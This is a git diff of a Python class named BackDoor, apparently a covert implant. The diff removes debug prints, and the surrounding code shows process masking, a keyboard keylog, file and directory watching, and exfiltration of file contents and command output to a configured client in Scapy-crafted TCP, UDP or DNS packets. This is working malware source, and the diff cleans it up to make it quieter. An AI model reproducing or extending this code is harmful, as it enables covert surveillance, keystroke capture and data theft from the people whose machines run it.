@@ -208,17 +208,11 @@ class BackDoor:
         self.client = config['covert']['client']
         self.sequence = config['share']['sequence']
         self.file_port = config['share']['file_port']
-        print(f"Masked as {self.masked_name}")
-        print(f"log to {self.log}")
-        print(f"device is {self.device}")
-        print(f"Send is {self.send_port}")
-        print(f"recv is {self.recv_port}")
-        print(f"proto  is {self.proto}")
-        print(f"file  is {self.watch_file}")
-        print(f"dir  is {self.watch_dir}")
-        print(f"client default is {self.client}")
-        print(f"seqwuence  is {self.sequence}")
-        print(f"file_port  is {self.file_port}")
+        print(f"Process masked as: {self.masked_name}")
+        print(f"keylog stored in {self.log}")
+        print(f"Keyboard: {self.device}")
+        print(f"Protocol is: {self.proto}")
+
 
     def watch_settings(self, path) -> tuple[str, str]:
         file = path.split("/")[-1]
@@ -249,18 +243,14 @@ class BackDoor:
         """Gets file data and sends through specified protocol"""
         filename = ""
         if path:
-            print(f"sending {path}")
             filename = path.split("/")[-1]
             binary_data = self.get_file_bin(path)
         else:
-            print("getting binary for command")
             binary_data = self.get_bin(data)
 
         if self.proto == "tcp":
-            print(f"Now creating packet to send {binary_data, filename}")
             self.create_tcp(binary_data, filename)
         elif self.proto == "udp" or "dns":
-            print(f"sending {self.proto}")
             self.create_udp(binary_data, filename)
         else:
            return
@@ -272,14 +262,11 @@ class BackDoor:
         else:
             src = RandShort()
             terminator = b'|||'
-            print(f"set src and terminator {src, terminator}")
         return src, terminator
 
     def create_tcp(self, data: List, name: str) -> None:
         """Creates a TCP packet and embeds data in payload"""
-        print("Creating TCP packets")
         src, terminator = self.set_terminator(name)
-        print(f"got src and terminator {src, terminator}")
         packets = []
         for index, byte in enumerate(data):
             packet = IP(dst=self.client) / TCP(sport=src, dport=self.send_port) / Raw(load=byte)
@@ -288,7 +275,6 @@ class BackDoor:
         # Add packet to specify end of msg
         packet = IP(dst=self.client) / TCP(sport=src, dport=self.send_port) / Raw(load=terminator)
         packets.append(packet)
-        print(f"packet array done: {len(packets)}")
         self.send_pkt(packets)
 
     def create_dns(self, data: List, name: str) -> None:
@@ -312,7 +298,6 @@ class BackDoor:
 
     def create_udp(self, data: List, name: str) -> None:
         """Creates a UDP packet and embeds data in payload"""
-        print("Creating UDP packets")
         src, terminator = self.set_terminator(name)
 
         packets = []
@@ -337,7 +322,6 @@ class BackDoor:
 
     def send_pkt(self, packets: List) -> None:
         """Sends packets"""
-        print("Sending packets")
         try:
             send(packets, verbose=0)
         except PermissionError:
@@ -456,7 +440,6 @@ class BackDoor:
         self.client = ip
 
     def decrypt_data(self, encrypted_msg: str) -> str:
-        print(f"pre de hex: {encrypted_msg}")
         encrypted_byte_stream = bytes.fromhex(encrypted_msg)
         print(1)
         cipher = self.generate_cipher()
